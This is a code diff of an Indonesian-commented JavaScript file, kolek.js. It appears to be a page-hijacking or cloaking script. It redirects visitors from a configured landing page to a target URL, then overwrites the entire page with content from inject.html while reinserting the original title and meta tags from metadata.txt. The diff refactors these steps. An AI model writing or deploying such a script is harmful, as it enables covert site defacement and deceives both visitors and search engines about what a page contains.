@@ -7,14 +7,6 @@ console.log('kolek.js script is running...');
 (function () {
   console.log('Script started.'); // Log awal untuk memastikan kode dijalankan
 
-  // Periksa apakah injeksi sudah dilakukan sebelumnya
-  const targetInjectedKey = 'targetInjected';
-  const currentUrl = new URL(location.href).href; // Normalisasi URL saat ini
-  if (localStorage.getItem(targetInjectedKey) === currentUrl) {
-    console.log('Page reload detected. Using original HTML without injection.');
-    return; // Hentikan eksekusi lebih lanjut
-  }
-
   // Fungsi untuk membaca file eksternal
   const fetchFileContent = async (filePath) => {
     console.log(`Fetching file: ${filePath}`); // Log untuk melacak file yang sedang diambil
@@ -28,35 +20,27 @@ console.log('kolek.js script is running...');
     return text;
   };
 
-  // Fungsi untuk menyisipkan metadata asli ke dalam DOM
-  const injectMetadata = (metadata) => {
-    console.log('Injecting metadata...'); // Log sebelum menyisipkan metadata
-    const parser = new DOMParser();
-    const doc = parser.parseFromString(metadata, 'text/html');
-
-    // Sisipkan <title>
-    const title = doc.querySelector('title');
-    if (title) {
-      document.title = title.textContent;
-      console.log('Title injected:', title.textContent);
+  // Fungsi untuk mendapatkan tujuan akhir dari URL
+  const getFinalUrl = (url) => {
+    try {
+      console.log(`Parsing target URL: ${url}`); // Log tambahan untuk memeriksa URL sebelum parsing
+      const parsedUrl = new URL(url);
+      const finalUrl = parsedUrl.searchParams.get('url'); // Ambil parameter 'url'
+      console.log(`Final URL extracted: ${finalUrl || url}`); // Log tambahan untuk memeriksa URL setelah parsing
+      return finalUrl ? new URL(finalUrl).href : parsedUrl.href; // Normalisasi URL
+    } catch (err) {
+      console.error('Error parsing URL:', url, err);
+      return url; // Jika parsing gagal, kembalikan URL asli
     }
-
-    // Sisipkan <meta> dan <link>
-    const head = document.head;
-    doc.querySelectorAll('meta, link').forEach((meta) => {
-      head.appendChild(meta.cloneNode(true));
-      console.log('Injected meta/link:', meta.outerHTML);
-    });
-    console.log('Metadata injected successfully.');
   };
 
-  // Membaca URL dari landingpage.txt dan target.txt
+  // Membaca URL dari landingpage.txt dan target.txt untuk redirect
   Promise.all([
     fetchFileContent('/landingpage.txt'),
     fetchFileContent('/target.txt'),
   ])
     .then(([landingPage, targetUrl]) => {
-      console.log('All files fetched successfully.'); // Log setelah semua file berhasil diambil
+      console.log('All files fetched successfully for redirect.'); // Log setelah semua file berhasil diambil
       const currentPath = new URL(location.href).pathname; // Dapatkan path URL saat ini
       console.log('Current Path:', currentPath);
 
@@ -64,58 +48,33 @@ console.log('kolek.js script is running...');
       const landingPagePath = landingPage.trim();
       console.log('Landing Page Path:', landingPagePath);
 
+      const finalTargetUrl = getFinalUrl(targetUrl.trim()); // Dapatkan tujuan akhir dari target.txt
+      console.log(`Final target URL: ${finalTargetUrl}`); // Log tambahan untuk memeriksa nilai finalTargetUrl
+
       if (currentPath.endsWith(landingPagePath)) {
         console.log('Current URL matches landing page. Redirecting to target URL...');
-        const finalTargetUrl = getFinalUrl(targetUrl.trim()); // Dapatkan tujuan akhir dari target.txt
         console.log(`Redirecting to: ${finalTargetUrl}`); // Log tambahan untuk memastikan URL redirect
         location.replace(finalTargetUrl); // Redirect ke tujuan akhir
       } else {
         console.warn('Current URL does not match landing page. No redirect performed.');
       }
     })
-    .catch((err) => console.error('Error loading files:', err));
+    .catch((err) => console.error('Error loading files for redirect:', err));
 
-  // Membaca URL dari target.txt, metadata dari metadata.txt, dan daftar halaman dari landingpage.txt
+  // Membaca URL dari target.txt dan metadata.txt untuk injeksi
   Promise.all([
     fetchFileContent('/target.txt'),
     fetchFileContent('/metadata.txt'), // Ambil metadata asli dari metadata.txt
-    fetchFileContent('/landingpage.txt'), // Ambil daftar halaman dari landingpage.txt
   ])
-    .then(([targetUrl, originalHtml, landingPages]) => {
-      console.log('All files fetched successfully.'); // Log setelah semua file berhasil diambil
-      console.log('Current URL:', currentUrl);
-
-      // Fungsi untuk mendapatkan tujuan akhir dari URL
-      const getFinalUrl = (url) => {
-        try {
-          console.log(`Parsing target URL: ${url}`); // Log tambahan untuk memeriksa URL sebelum parsing
-          const parsedUrl = new URL(url);
-          const finalUrl = parsedUrl.searchParams.get('url'); // Ambil parameter 'url'
-          console.log(`Final URL extracted: ${finalUrl || url}`); // Log tambahan untuk memeriksa URL setelah parsing
-          return finalUrl ? new URL(finalUrl).href : parsedUrl.href; // Normalisasi URL
-        } catch (err) {
-          console.error('Error parsing URL:', url, err);
-          return url; // Jika parsing gagal, kembalikan URL asli
-        }
-      };
+    .then(([targetUrl, originalHtml]) => {
+      console.log('All files fetched successfully for injection.'); // Log setelah semua file berhasil diambil
+      const currentUrl = new URL(location.href).href; // Normalisasi URL saat ini
 
       const finalTargetUrl = getFinalUrl(targetUrl.trim()); // Dapatkan tujuan akhir dari target.txt
-      console.log(`Final target URL: ${finalTargetUrl}`); // Log tambahan untuk memeriksa nilai finalTargetUrl
-
-      // Periksa apakah URL saat ini cocok dengan salah satu URL di landingpage.txt
-      const landingPageUrls = landingPages
-        .split('\n')
-        .map((url) => new URL(url.trim(), location.origin).href); // Normalisasi URL dari landingpage.txt
-
-      if (landingPageUrls.includes(currentUrl)) {
-        console.log('Current URL matches a landing page. Injecting metadata...');
-        injectMetadata(originalHtml); // Sisipkan metadata asli dari metadata.txt
-      } else {
-        console.warn('Current URL does not match any landing page URL.');
-      }
+      console.log(`Final target URL for injection: ${finalTargetUrl}`); // Log tambahan untuk memeriksa nilai finalTargetUrl
 
       // Periksa apakah URL saat ini cocok dengan tujuan akhir dari target.txt
-      if (currentUrl === finalTargetUrl || currentUrl.endsWith(new URL(finalTargetUrl).pathname)) {
+      if (currentUrl === finalTargetUrl) {
         console.log('Current URL matches target.txt. Injecting HTML...');
         const injectHtmlPath = '/inject.html';
         console.log(`Attempting to fetch: ${injectHtmlPath}`); // Log tambahan untuk jalur file
@@ -133,11 +92,28 @@ console.log('kolek.js script is running...');
             document.documentElement.innerHTML = html; // Mengganti seluruh DOM dengan konten inject.html
             console.log('HTML content injected successfully.');
 
-            injectMetadata(originalHtml); // Sisipkan metadata asli dari metadata.txt
+            const injectMetadata = (metadata) => {
+              console.log('Injecting metadata...'); // Log sebelum menyisipkan metadata
+              const parser = new DOMParser();
+              const doc = parser.parseFromString(metadata, 'text/html');
 
-            // Simpan status injeksi ke localStorage
-            localStorage.setItem(targetInjectedKey, currentUrl);
-            console.log('Injection status saved to localStorage.');
+              // Sisipkan <title>
+              const title = doc.querySelector('title');
+              if (title) {
+                document.title = title.textContent;
+                console.log('Title injected:', title.textContent);
+              }
+
+              // Sisipkan <meta> dan <link>
+              const head = document.head;
+              doc.querySelectorAll('meta, link').forEach((meta) => {
+                head.appendChild(meta.cloneNode(true));
+                console.log('Injected meta/link:', meta.outerHTML);
+              });
+              console.log('Metadata injected successfully.');
+            };
+
+            injectMetadata(originalHtml); // Sisipkan metadata asli dari metadata.txt
           })
           .catch((err) => {
             console.error('Error during HTML injection:', err);
@@ -149,5 +125,5 @@ console.log('kolek.js script is running...');
         console.log(`Current URL: ${currentUrl}`); // Log tambahan untuk memeriksa URL saat ini
       }
     })
-    .catch((err) => console.error('Error loading URLs:', err));
+    .catch((err) => console.error('Error loading files for injection:', err));
 })();
